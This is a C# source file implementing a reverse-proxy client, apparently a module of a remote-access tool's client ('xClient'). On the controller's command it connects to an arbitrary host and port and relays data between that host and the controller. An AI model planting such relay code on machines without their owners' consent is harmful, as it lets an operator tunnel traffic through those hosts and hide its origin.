using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using xClient.Core.ReverseProxy.Packets;

namespace xClient.Core.ReverseProxy
{
    public class ReverseProxyClient
    {
        public const int BUFFER_SIZE = 8192;

        public int ConnectionId { get; private set; }
        public Socket Handle { get; private set; }
        public string Target { get; private set; }
        public int Port { get; private set; }
        public Client Client { get; private set; }
        private byte[] Buffer;
        private bool DisconnectIsSend = false;

        public ReverseProxyClient(ReverseProxy_Connect Command, Client client)
        {
            this.ConnectionId = Command.ConnectionId;
            this.Target = Command.Target;
            this.Port = Command.Port;
            this.Client = client;
            this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //Non-Blocking connect, so there is no need for a extra thread to create
            this.Handle.BeginConnect(Command.Target, Command.Port, Handle_Connect, null);
        }

        private void Handle_Connect(IAsyncResult ar)
        {
            try
            {
                this.Handle.EndConnect(ar);
            }
            catch { }

            if (this.Handle.Connected)
            {
                this.Buffer = new byte[BUFFER_SIZE];
                this.Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, Handle_BeginReceive, null);

                IPEndPoint LocalEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
                new ReverseProxy_ConnectResponse(ConnectionId, true, LocalEndPoint.Address.Address, LocalEndPoint.Port).Execute(Client);
            }
            else
            {
                new ReverseProxy_ConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
            }
        }

        private void Handle_BeginReceive(IAsyncResult ar)
        {
            //Receive here data from e.g. a WebServer

            try
            {
                int Received = Handle.EndReceive(ar);

                if (Received <= 0)
                {
                    Disconnect();
                    return;
                }

                byte[] Payload = new byte[Received];
                Array.Copy(Buffer, Payload, Received);
                new ReverseProxy_Data(this.ConnectionId, Payload).Execute(Client);
            }
            catch
            {
                Disconnect();
                return;
            }

            try
            {
                this.Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
            }
            catch
            {
                Disconnect();
                return;
            }
        }

        public void Disconnect()
        {
            if (!DisconnectIsSend)
            {
                DisconnectIsSend = true;
                //send to the Server we've been disconnected
                new ReverseProxy_Disconnect(this.ConnectionId).Execute(Client);
            }

            try
            {
                Handle.Close();
            }
            catch { }
        }

        public void SendToTargetServer(byte[] Data)
        {
            try
            {
                Handle.Send(Data);
            }
            catch { Disconnect(); }
        }
    }
}
